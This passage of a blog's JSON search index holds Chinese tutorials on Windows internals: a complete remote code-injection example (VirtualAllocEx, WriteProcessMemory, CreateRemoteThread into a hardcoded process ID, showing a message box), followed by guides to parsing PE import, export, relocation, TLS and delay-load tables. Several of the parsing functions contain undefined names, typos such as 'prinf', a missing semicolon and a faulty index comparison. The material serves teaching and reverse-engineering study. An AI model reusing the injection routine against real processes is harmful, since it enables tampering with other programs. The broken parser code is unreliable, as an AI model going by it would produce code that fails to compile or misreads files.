DWORD))pData-&gt;dwGetModuleFileName; // 加载user32.dll HMODULE hModule = MyLoadLibrary((LPCTSTR)pData-&gt;User32Dll); MyMessageBox = (int(__stdcall*)(HWND, LPCTSTR, LPCTSTR, UINT))MyGetProcAddress(hModule, pData-&gt;MessageBox); char szModuleFileName[MAX_PATH] = &#123; 0 &#125;; MyGetModuleFileName(hModule, (LPTSTR)szModuleFileName, MAX_PATH); MyMessageBox(NULL, (LPCTSTR)pData-&gt;Str, (LPCTSTR)szModuleFileName, MB_OK); return 0;&#125;VOID noDllInjectCode(DWORD dwPid)&#123; // 打开进程获取进程句柄 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); if (hProcess == NULL) &#123; printf(&quot;OpenProcess Failed\\n&quot;); return; &#125; DATA Data = &#123; 0 &#125;; // 获取kernel32.dll中相关的导出函数 Data.dwLoadLibrary = GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32.dll&quot;)), &quot;LoadLibraryA&quot;); Data.dwGetProcAddress = GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32.dll&quot;)), &quot;GetProcAddress&quot;); Data.dwGetModuleHandle = GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32.dll&quot;)), &quot;GetModuleHandleA&quot;); Data.dwGetModuleFileName = GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32.dll&quot;)), &quot;GetModuleFileNameA&quot;); // 需要其他DLL和导出函数 lstrcpy((LPSTR)Data.User32Dll, TEXT(&quot;user32.dll&quot;)); lstrcpy((LPSTR)Data.MessageBox, TEXT(&quot;MessageBoxA&quot;)); lstrcpy((LPSTR)Data.Str, TEXT(&quot;Dokey Inject Code&quot;)); // 在目标进程申请内存空间 LPVOID lpData = VirtualAllocEx(hProcess, NULL, sizeof(Data), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (lpData == NULL) &#123; printf(&quot;VirtualAllocEx1 Failed\\n&quot;); return; &#125; // 将数据写入目标内存中 SIZE_T dwWriteLen = 0; BOOL bRet = WriteProcessMemory(hProcess, lpData, &amp;Data, sizeof(Data), &amp;dwWriteLen); if (bRet == FALSE) &#123; printf(&quot;WriteProcessMemory Failed\\n&quot;); return; &#125; // 在目标进程申请内存用于保存代码长度 DWORD dwFunction = 0x4000; LPVOID lpCode = VirtualAllocEx(hProcess, NULL, dwFunction, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (lpCode == NULL) &#123; printf(&quot;VirtualAllocEx2 Failed\\n&quot;); return; &#125; bRet = WriteProcessMemory(hProcess, lpCode, &amp;RemoteThreadProc, dwFunction, &amp;dwWriteLen); if (bRet == FALSE) &#123; printf(&quot;WriteProcessMemory Failed\\n&quot;); return; &#125; HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpCode, lpData, 0, NULL); if (hThread == NULL) &#123; printf(&quot;CreateRemoteThread Failed\\n&quot;); return; &#125; WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); return;&#125;int main()&#123; noDllInjectCode(3076); system(&quot;pause&quot;); return 0;&#125;","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"windows Inject","slug":"windows-Inject","permalink":"http://example.com/tags/windows-Inject/"}]},{"title":"数据目录表解析","slug":"数据目录表解析","date":"2023-05-09T13:40:35.000Z","updated":"2023-12-13T12:24:22.516Z","comments":true,"path":"9180d97d.html","link":"","permalink":"http://example.com/9180d97d.html","excerpt":"基础知识基地址(ImageBase): 当PE文件通过Windows加载器载入内存后，内存中的版本称为模块，映射文件的起始地址称为模块句柄，可通过句柄访问内存中其他数据结构，这个内存起始地址称为基地址。虚拟地址(VA): 在Windows系统中，PE文件被系统加载到内存后，每个程序都有自己的虚拟空间，这个虚拟空间的内存地址称为虚拟地址。相对虚拟地址(RVA): 可执行文件中，有许多地方需要指定内存中的地址。例如，应用全局变量时需要指定它的地址。为了避免在PE文件中出现绝对内存地址引入了相对虚拟地址，它就是在内存中相对于PE文件载入地址的偏移量。文件偏移地址(FOA): 当PE文件存储在磁盘中时，某个数据的位置相对于文件头的偏移量称为文件偏移地址(FOA)。文件偏移地址从PE文件中的第一个字节开始计数，起始值为0。它们之间的关系：虚拟地址(VA) &#x3D; 基地址(ImageBase) + 相对虚拟地址(RVA)","text":"基础知识基地址(ImageBase): 当PE文件通过Windows加载器载入内存后，内存中的版本称为模块，映射文件的起始地址称为模块句柄，可通过句柄访问内存中其他数据结构，这个内存起始地址称为基地址。虚拟地址(VA): 在Windows系统中，PE文件被系统加载到内存后，每个程序都有自己的虚拟空间，这个虚拟空间的内存地址称为虚拟地址。相对虚拟地址(RVA): 可执行文件中，有许多地方需要指定内存中的地址。例如，应用全局变量时需要指定它的地址。为了避免在PE文件中出现绝对内存地址引入了相对虚拟地址，它就是在内存中相对于PE文件载入地址的偏移量。文件偏移地址(FOA): 当PE文件存储在磁盘中时，某个数据的位置相对于文件头的偏移量称为文件偏移地址(FOA)。文件偏移地址从PE文件中的第一个字节开始计数，起始值为0。它们之间的关系：虚拟地址(VA) &#x3D; 基地址(ImageBase) + 相对虚拟地址(RVA) 数据目录表结构1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; // 虚拟地址，就是数据目录表的起始位置 DWORD Size; // 尺寸，起始地址 + 尺寸 = 结束的位置&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; Directory Entries12345678910111213141516#define IMAGE_DIRECTORY_ENTRY_EXPORT 0 // Export Directory 导出表#define IMAGE_DIRECTORY_ENTRY_IMPORT 1 // Import Directory 导入表#define IMAGE_DIRECTORY_ENTRY_RESOURCE 2 // Resource Directory 资源表#define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3 // Exception Directory 异常#define IMAGE_DIRECTORY_ENTRY_SECURITY 4 // Security Directory 安全#define IMAGE_DIRECTORY_ENTRY_BASERELOC 5 // Base Relocation Table 重定位表#define IMAGE_DIRECTORY_ENTRY_DEBUG 6 // Debug Directory 调试信息// IMAGE_DIRECTORY_ENTRY_COPYRIGHT 7 // (X86 usage)#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 7 // Architecture Specific Data 版权信息#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR 8 // RVA of GP#define IMAGE_DIRECTORY_ENTRY_TLS 9 // TLS Directory TLS表#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10 // Load Configuration Directory #define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11 // Bound Import Directory in headers#define IMAGE_DIRECTORY_ENTRY_IAT 12 // Import Address Table 导入函数地址表#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13 // Delay Load Import Descriptors#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 // COM Runtime descriptor 地址函数转换与PE结构有关的三种地址VA(虚拟地址)：PE文件映射到内存后的地址RVA(相对虚拟地址)：内存地址相对于映射基地址的偏移地址FileOffset(文件偏移地址)：相对PE文件在磁盘上的文件开头的偏移地址FOA &#x3D; RVA - HFOA &#x3D; VA - ImageBase - H 判断RVA是否在头部 FOA &#x3D; RVA 判断RVA位于哪个节 RVA &gt;&#x3D; Section[i]-&gt;VirtualAddress RVA &lt;&#x3D; Section[i]-&gt;VirtualAddress + 当前节内存对齐后的大小 FOA &#x3D; RVA - Section[i]-&gt;VirtualAddress + Section[i]-&gt;PointerToRawData 转换函数代码123456789101112131415161718192021222324DWORD RVAToFOA(DWORD dwRVA, char* buffer)&#123; // dwRVA 相对虚拟函数 buffer 已加载的文件内存映像 // DOS头 PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer; // NT 头 PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer); // 区段 PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeader); // 判断是否落在头部 if(dwRVA &lt; pSectionHeader[0].VirtualAddress) &#123; return dwRVA; &#125; for(int i = 0; i &lt; pNtHeader-&gt;FileHeader.NumberOfSections; i++) &#123; // 判断落在哪个区段 if(dwRVA &gt;= pSectionHeader[i].VirtualAddress &amp;&amp; dwRVA &lt;= pSectionHeader[i].VirtualAddress + pSectionHeader[i].Misc.VirtualSize) &#123; return dwRVA - pSectionHeader[i].VirtualAddress + pSectionHeader[i].PointerToRawData; &#125; &#125; return dwRVA;&#125; _IMAGE_IMPORT_DESCRIPTOR(导入表)IMAGE_IMPORT_DESCRIPTOR结构体123456789101112131415typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristics; // 0 for terminating null import descriptor DWORD OriginalFirstThunk; // RVA to original unbound IAT (PIMAGE_THUNK_DATA) &#125; DUMMYUNIONNAME; DWORD TimeDateStamp; // 0 if not bound, // -1 if bound, and real date\\time stamp // in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND) // O.W. date/time stamp of DLL bound to (Old BIND) DWORD ForwarderChain; // -1 if no forwarders DWORD Name; DWORD FirstThunk; // RVA to IAT (if bound this IAT has actual addresses)&#125; IMAGE_IMPORT_DESCRIPTOR;typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; IMAGE_IMPORT_DESCRIPTOROriginalFirstThunk: 该字段指向导入名称表（INT）的RVA，该RVA指向的是一个IMAGE_THUNK_DATA的结构体TimeDateStamp: 该字段可以被忽略，一般为0即可ForwarderChain: 该字段一般为0Name: 该字段指向DLL名称的RVA地址FirstThunk: 该字段包含导入地址表（IAT）的RVA，IAT是一个IMAGE_THUNK_DATA的结构体数组 IMAGE_THUNK_DATA结构体123456789typedef struct _IMAGE_THUNK_DATA32 &#123; union &#123; DWORD ForwarderString; // PBYTE DWORD Function; // PDWORD DWORD Ordinal; DWORD AddressOfData; // PIMAGE_IMPORT_BY_NAME &#125; u1;&#125; IMAGE_THUNK_DATA32;typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32; IMAGE_THUNK_DATAForwarderString: 是转向它的第一个索引的函数的名称的RVAFunction: 代表输入函数的地址Ordinal: 代表该函数在导入DLL中的序号。只有当IMAGE_THUNK_DATA的最高位为1时才代表使用序号导入，此时低31位代表在导入DLL中该函数的序号AddressOfData: 指向IMAGE_IMPORT_BY_NAME的一个指针，它表示用函数名进行导入。当IMAGE_THUNK_DATA的最高位为0时代表使用函数名进行导入，此时这四个字节代表着IMAGE_IMPORY_BY_NAME的RVA每一个IMAGE_THUNK_DATA对应一个DLL中的导入函数。IMAGE_THUNK_DATA与IMAGE_IMPORT_DESCRIPORT类似，同样是一个以全”0”的IMAGE_THUNK_DATA为结束当IMAGE_THUNK_DATA值的最高位为1时，表示函数以序号方式导入，这时低31位被看作一个导入序号。当其最高位为0时；表示函数以函数名称字符串的方式导入，这时DWORD的值表示一个RVA，并指向一个IMAGE_IMPORT_BY_NAME结构体 IMAGE_IMPORT_BY_NAME结构体1234typedef struct _IMAGE_IMPORT_BY_NAME &#123; WORD Hint; CHAR Name[1];&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; IMAGE_IMPORT_BY_NAMEHint: 该字段表示该函数在其导入表中的序号Name: 该字段表示导入函数的函数名。导入函数是一个以ASCII编码的字符串，并以NULL结尾。在IMAGE_IMPORT_BY_NAME中使用Name[1]来定义该字段，表示这是只有1个长度大小的字符串，但是函数名不可能只有一个字节的长度，通过越界访问来达到访问变长字符串的功能 注意IMAGE_IMPORT_DESCRIPTOR结构体中的OriginalFirstThunk和FirstThunk都指向了IMAGE_THUNK_DATA这个结构体，但是两者是有区别的。当文件在磁盘上时，两者指向的IMAGE_THUNK_DATA是相同的内容，而当文件被载入内存后，两者指向的就是不同的内容在磁盘上时，OriginalFirstThunk指向的IMAGE_THUNK_DATA中保存的是指向函数名的RVA，称其为INT。FirstThunk通常指向的IMAGE_THUNK_DATA中保存的也是指向函数名的RVA，它们在磁盘上是没有差异的当文件被载入内存后，OriginalFirstThunk指向的IMAGE_THUNK_DATA中保存的是指向函数名的RVA；FirstThunk通常指向的IMAGE_THUNK_DATA中由装载器填充的导入函数地址，称其为IAT。 解析导入表代码123456789101112131415161718192021222324252627282930313233DWORD PrintImportTable(char* buffer)&#123; // DOS 头 PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer; // NT 头 PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer); // 定位导入表 PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_IMPORT); // 填充结构体 PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(RVAToFOV(pData.Dir.VirtualAddress, buffer) + buffer); while(pImport-&gt;Name) &#123; char* szDllName = (char*)(RVAToFOA(pImport-&gt;Name, buffer) + buffer); printf(&quot;DllName: %s\\n&quot;, szDllName); printf(&quot;TimeDateStamp：%08x\\n&quot;, pImport-&gt;TimeDateStamp); printf(&quot;ForwarderChain：%08x\\n&quot;, pImport-&gt;ForwarderChain); printf(&quot;Name Offset：%08x\\n&quot;, pImport-&gt;Name); printf(&quot;FirstThunk：%08x\\n&quot;, pImport-&gt;FirstThunk); printf(&quot;OriginalFirstThunk：%08x\\n\\n&quot;, pImport-&gt;OriginalFirstThunk); PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)(RVAToFOA(pImport-&gt;FirstThunk, buffer) + buffer); while(pIAT-&gt;u1.Ordinal != 0) &#123; if(!IMAGE_SNAP_BY_ORDINAL32(pIAT-&gt;u1.Ordinal)) &#123; PIMAGE_IMPORT_BY_NAME pFunctionName = (PIMAGE_IMPORT_BY_NAME)(RVAToFOA(pIAT-&gt;u1.AddressOfData, buffer) + buffer); printf(&quot;Function Name: %s\\n&quot;, pFunctionName); &#125; pIAT++; &#125; pImport++ &#125;&#125; _IMAGE_EXPORT_DIRECTORY(导出表)IMAGE_EXPORT_DIRECTORY结构体12345678910111213typedef struct _IMAGE_EXPORT_DIRECTORY &#123; DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; // RVA from base of image DWORD AddressOfNames; // RVA from base of image DWORD AddressOfNameOrdinals; // RVA from base of image&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; IMAGE_EXPORT_DIRECTORYCharacteristics: 保留，必须为0TimeDateStamp: 时间戳MajorVersion: 主要版本号，主要和次要版本号可由用户设置MinorVersion: 次要版本号Name: 名称RVA，包含导出文件名称的ASCII字符串地址Base: 此映像中导出的起始序号，指定导出地址表（AddressOfFunctions）的起始序号，通常设置为1NumberOfFunctions: 导出函数的个数，导出地址表（AddressOfFunctions）中的条目数NumberOfNames: 按名称导出的函数个数，名称表（AddressOfFunctions）中的条目数，同样也是序号表（AddressOfNameOrdinals）中的条目数AddressOfFunctions: 导出地址表RVAAddressOfNames: 导出名称表RVAAddressOfNameOrdinals: 序号表RVA 解析导出表12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061void PrintExportTable(char* buffer)&#123; // DOS PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer; // NT PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer); // 定位导出表 PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT); // 填充结构体 PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(RVAToFOA(pDataDir-&gt;VirtualAddress, buffer) + buffer); if (pExport-&gt;AddressFunctions == 0) &#123; printf(&quot;当前没有导出表!\\n&quot;); return; &#125; char* szDllName = (char*)(RVAToFOA(pExport-&gt;Name, buffer) + buffer); printf(&quot;DllName: %s\\n&quot;, DllName); printf(&quot;Base: %#08x\\n&quot;, pExport-&gt;Base); printf(&quot;NumberOfFunctions: %#08x\\n&quot;, pExport-&gt;NumberOfFunctions); printf(&quot;NumberOfNames: %#08x\\n&quot;, pExport-&gt;NumberOfNames); printf(&quot;AddressOfFunctions: %#08x\\n&quot;, pExport-&gt;AddressOfFunctions); printf(&quot;AddressOfNames: %#08x\\n&quot;, pExport-&gt;AddressOfNames); printf(&quot;AddressOfNameOrdinals: %#08x\\n&quot;, pExport-&gt;AddressOfNameOrdinals); // 函数数量 DWORD dwNumberOfFunctions = pExport-&gt;NumberOfFunctions; // 函数名数量 DWORD dwNumberOfNames = pExport-&gt;NumberOfNames; // Base DWORD dwBase = pExport-&gt;Base; // 导出地址表 PDWORD pExportAddrTable = (PDWORD)(RVAToFOA(pExport-&gt;AddressOfFunctions, buffer) + buffer); // 导出名称表 PDWORD pExportNameTable = (PDWORD)(RVAToFOA(pExport-&gt;AddressOfNames, buffer) + buffer); // 导出序号表 PWORD pExportIdTable = (PWORD)(RVAToFOA(pExport-&gt;AddressOfNameOrdinals, buffer) + buffer); for(int i = 0; i &lt; dwNumberOfFunctions; i++) &#123; if(pExportAddrTable[i] == i) &#123; continue; &#125; DWORD id = 0; for (; id &lt; dwNumberOfNames; id++) &#123; if(pExportIdTable[i] == id) &#123; break; &#125; &#125; if (id == dwNumberOfNames) &#123; printf(&quot;ID: %x Address: %#08x Name[NULL]\\n&quot;, i + dwBase, pExportAddrTable[i]); &#125; else &#123; char* szFunName = (char*)(RVAToFileOffset(pExportNameTable[id], buffer) + buffer); printf(&quot;ID: %x Address: %#08x Name[%s]\\n&quot;, i + dwBase, pExportAddrTable[i], szFunName); &#125; &#125;&#125; _IMAGE_BASE_RELOCATION(重定位表)123456typedef struct _IMAGE_BASE_RELOCATION &#123; DWORD VirtualAddress; DWORD SizeOfBlock;// WORD TypeOffset[1];&#125; IMAGE_BASE_RELOCATION;typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION; _IMAGE_BASE_RELOCATIONVirtualAddress: 指向需要重定位地址的RVA，每个INAGE_BASE_RELOCATION只负责4kb大小分页内的重定位信息。因此结构中的VirtualAddress值为0x1000的倍数SizeOfBlock: imageBase结构体和TypeOffset的总和 重定位块的大小TypeOffset[1]: 自定义的一个字段，表示这个结构体下面会出现WORD类型的数组，该数组元素的就是硬编码在程序当中的偏移自定义TypeOffset结构typedef struct _TYPE{ WORD Offset: 12; &#x2F;&#x2F; 大小2bit重定位的偏移 WORD Type: 4;} TYPE, *PTYPE; Windows的PE装载器进行PE重定位处理的操作原理流程在应用程序当中查找硬编码位置读取之后减去ImageBase，也就是用VA - 基址 &#x3D; RVA加上实际加载地址得到真正的VA其中最关键的就是找到硬编码的位置，而要找到硬编码的位置，首先要找到基址重定位表，该表位于.reloc区段，找到基址重定位表的正确打开方式是通过数据目录表IMAGE_DATA_DIRECTORY条目查找 解析重定位表123456789101112131415161718192021222324252627282930313233343536373839void PrintBaseRelocTable(char* buffer)&#123; // 自定义TypeOffset结构 typedef struct _TYPE&#123; WORD Offset: 12; WORD Type: 4; &#125; TYPE, *PTYPE; // DOS PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer; // NT PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer); // SECTION Header PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRSET_SECTION(pNtHeader); // 定位重定位表 PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirtory + IMAGE_DIRECTORY_ENTRY_BASERELOC); // 填充结构体 PIMAGE_BASE_RELOCATION pBaseReloc = (PIMAGE_BASE_RELOCATION)(RVAToFOA(pDataDir-&gt;VirtualAddress, buffer) + buffer); while(pBaseReloc-&gt;SizeOfBlock != 0) &#123; // 找到本0x1000个字节的起始位置 // 重定位个数 = （SizeOfBlock - 8（IMAGE_BASE_RELOCATION）） / 2（每个TypeOffset是2个字节） DWORD dwCount = (DWORD)(pBaseReloc-&gt;SizeOfBlock - 8) / 2; DWORD dwRVA = pBaseReloc-&gt;VirtualAddres; PTYPE pRelocAddr = (PTYPE)(pBaseReloc + 1); printf(&quot;SECTION: %#08X\\n&quot;, pSectionHeader-&gt;Name); printf(&quot;RVA: %#08X\\n&quot;, dwRVA); printf(&quot;ITEMS: %x H / %d D\\n&quot;, pBaseReloc-&gt;SizeOfBlock, pBaseReloc-&gt;SizeOfBlock); // 找到下一个0x1000个字节 pBaseReloc = (PIMAGE_BASE_RELOCATION)((char*)pBaseReloc + pBaseReloc-&gt;SizeOfBlock); for (int i = 0; i &lt; dwCount; i++) &#123; PDWORD pData = (PDWORD)(RVAToFOA(pRelocAddr[i].Offset + dwRVA, buffer) + buffer); DWORD pDataOffset = RVAToFOA(pRelocAddr[i].Offset + dwRVA, buffer); printf(&quot;SECTION: %#08x\\n&quot;, *pData); printf(&quot;RVA: %#08x\\n&quot;, pRelocAddr[i].Offset + dwRVA); printf(&quot;OFFSET: %#08x\\n\\n&quot;, pDataOffset); &#125; &#125;&#125; _IMAGE_TLS_DIRECTORY(TLS表)1234567891011121314151617typedef struct _IMAGE_TLS_DIRECTORY32 &#123; DWORD StartAddressOfRawData; DWORD EndAddressOfRawData; DWORD AddressOfIndex; // PDWORD DWORD AddressOfCallBacks; // PIMAGE_TLS_CALLBACK * DWORD SizeOfZeroFill; union &#123; DWORD Characteristics; struct &#123; DWORD Reserved0 : 20; DWORD Alignment : 4; DWORD Reserved1 : 8; &#125; DUMMYSTRUCTNAME; &#125; DUMMYUNIONNAME;&#125; IMAGE_TLS_DIRECTORY32;typedef IMAGE_TLS_DIRECTORY32 * PIMAGE_TLS_DIRECTORY32; _IMAGE_TLS_DIRECTORY32StartAddressOfRawData: TLS初始化数据起始地址EndAddressOfRawData: TLS初始化结束地址，两个正好定位一个范围，范围放初始化的值AddressOfIndex: TLS索引位置AddressOfCallBacks: TLS回调函数的数组指针SizeOfZeroFill: 填充0的个数Characteristics: 保留TLS: 线程本地存储器，可以将数据与执行的特定线程联系起来。怎么理解？如果一个变量是全局的，那么所有线程访问的是同一份，某一个线程对其修改会影响其他所有线程。如果我们需要一个变量在每个线程中都能访问，并且值在每个线程中互不影响，这就是TLS。线程局部存储在不同平台有不同的实现，可移植性不好。线程局部存储不难实现，最简单的办法就是建立一个全局表，通过当前线程ID去查询相应的数据，因为各个线程ID不同，查到的数据自然也不同。 解析TLS表1234567891011121314151617void PrintTLSTable(char* buffer)&#123; // DOS PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer; // NT PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer); // 定位TLS表 PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.VirtualAddres + IMAGE_DIRECTORY_ENTRY_TLS); // 填充结构体 PIMAGE_TLS_DIRECTORY pTLS = (PIMAGE_TLS_DIRECTORY)(RVAToFOA(pDataDir-&gt;VirtualAddress, buffer) + buffer); prinf(&quot;StartAddressOfRawData: %#08x\\n&quot;, pTLS-&gt;StartAddressOfRawData); prinf(&quot;EndAddressOfRawData: %#08x\\n&quot;, pTLS-&gt;EndAddressOfRawData); prinf(&quot;AddressOfIndex: %#08x\\n&quot;, pTLS-&gt;AddressOfIndex); prinf(&quot;AddressOfCallBacks: %#08x\\n&quot;, pTLS-&gt;AddressOfCallBacks); prinf(&quot;SizeOfZeroFill: %#08x\\n&quot;, pTLS-&gt;SizeOfZeroFill); prinf(&quot;Characteristics: %#08x\\n&quot;, pTLS-&gt;Characteristics);&#125; _IMAGE_DELAYLOAD_DESCRIPTOR(延时加载表)12345678910111213141516171819typedef struct _IMAGE_DELAYLOAD_DESCRIPTOR &#123; union &#123; DWORD AllAttributes; struct &#123; DWORD RvaBased : 1; // Delay load version 2 DWORD ReservedAttributes : 31; &#125; DUMMYSTRUCTNAME; &#125; Attributes; DWORD DllNameRVA; // RVA to the name of the target library (NULL-terminate ASCII string) DWORD ModuleHandleRVA; // RVA to the HMODULE caching location (PHMODULE) DWORD ImportAddressTableRVA; // RVA to the start of the IAT (PIMAGE_THUNK_DATA) DWORD ImportNameTableRVA; // RVA to the start of the name table (PIMAGE_THUNK_DATA::AddressOfData) DWORD BoundImportAddressTableRVA; // RVA to an optional bound IAT DWORD UnloadInformationTableRVA; // RVA to an optional unload info table DWORD TimeDateStamp; // 0 if not bound, // Otherwise, date/time of the target DLL&#125; IMAGE_DELAYLOAD_DESCRIPTOR, *PIMAGE_DELAYLOAD_DESCRIPTOR; 解析延时加载表1234567891011121314151617// DOSPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;// NTPIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer);// 定位DelayImportTablePIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT);// 填充结构体PIMAGE_DELAYLOAD_DESCRIPTOR pDelayLoad = (PIMAGE_DELAYLOAD_DESCRIPTOR)(RVAToFileOffset(pDataDir-&gt;VirtualAddress, buffer) + buffer);char* szDllName = (char*)(RVAToFileOffset(pDelayLoad-&gt;DllNameRVA, buffer) + buffer);printf(&quot;%s\\n&quot;, szDllName);printf(&quot;Attributes: %#08x\\n&quot;, pDelayLoad-&gt;Attributes);printf(&quot;ModuleHandleRVA: %#08x\\n&quot;, pDelayLoad-&gt;ModuleHandleRVA);printf(&quot;ImportAddressTableRVA: %#08x\\n&quot;, pDelayLoad-&gt;ImportAddressTableRVA);printf(&quot;ImportNameTableRVA: %#08x\\n&quot;, pDelayLoad-&gt;ImportNameTableRVA);printf(&quot;BoundImportAddressTableRVA: %#08x\\n&quot;, pDelayLoad-&gt;BoundImportAddressTableRVA);printf(&quot;UnloadInformationTableRVA: %#08x\\n&quot;, pDelayLoad-&gt;UnloadInformationTableRVA);printf(&quot;TimeDateStamp: %#08x\\n&quot;, pDelayLoad-&gt;TimeDateStamp);","categories":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/categories/Windows-PE/"}],"tags":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/tags/Windows-PE/"}]},{"title":"Windows PE","slug":"Windows-PE","date":"2023-05-07T03:11:00.000Z","updated":"2023-12-14T13:17:06.486Z","comments":true,"path":"bd80384e.html","link":"","permalink":"http://example.com/bd80384e.html","excerpt":"Windows PE可执行文件（Executable file）指的是可以由操作系统进行加载执行的文件可执行文件的格式：Windows 平台 PE（Portable Executable）文件结构Linux 平台 ELF（Executable and Linking Format）文件结构","text":"Windows PE可执行文件（Executable file）指的是可以由操作系统进行加载执行的文件可执行文件的格式：Windows 平台 PE（Portable Executable）文件结构Linux 平台 ELF（Executable and Linking Format）文件结构 PE 文件结构PE 文件的整体结构PE 结构示例图 PE 文件主要结构PE 文件结构体宽度 结构体 宽度(字节) IMAGE_DOS_HEADER 64 IMAGE_FILE_HEADER 20 INAGE_OPTIONAL_HEADER32 244 IMAGE_SECTION_HEADER 40 PE 文件结构大小示例图 PE文件的两种状态PE文件的两种状态PE文件在运行前（静态，存储在磁盘上）和运行时（动态，运行在内存中）的格式是有差异的，这种差异对于我们理解PE文件是如何执行的来说很重要。我们在之前的文件分析过程中实际上所看到的是静态的内容，其大小是要根据FileAlignment的值进行文件对齐的，但是在运行时则整体按照扩展PE头的成员SectionAlignment的值进行内存对齐，默认情况下该值为0x1000： PE文件的两种状态 DOS头结构体12345678910111213141516171819202122typedef struct _IMAGE_DOS_HEADER &#123; // DOS .EXE header WORD e_magic; // Magic number WORD e_cblp; // Bytes on last page of file WORD e_cp; // Pages in file WORD e_crlc; // Relocations WORD e_cparhdr; // Size of header in paragraphs WORD e_minalloc; // Minimum extra paragraphs needed WORD e_maxalloc; // Maximum extra paragraphs needed WORD e_ss; // Initial (relative) SS value WORD e_sp; // Initial SP value WORD e_csum; // Checksum WORD e_ip; // Initial IP value WORD e_cs; // Initial (relative) CS value WORD e_lfarlc; // File address of relocation table WORD e_ovno; // Overlay number WORD e_res[4]; // Reserved words WORD e_oemid; // OEM identifier (for e_oeminfo) WORD e_oeminfo; // OEM information; e_oemid specific WORD e_res2[10]; // Reserved words LONG e_lfanew; // File address of new exe header &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; e_magic 为DOS可执行文件标识符，占用2字节，值为0x5A4De_lfanew 保存了PE头的起始位置 标准PE头12345typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER32 OptionalHeader;&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; _IMAGE_NT_HEADERSSignature: PE标识, 值为0x00004550FileHeader: 文件头OptionalHeader: 扩展头 文件头（标准PE头）123456789typedef struct _IMAGE_FILE_HEADER &#123; WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; 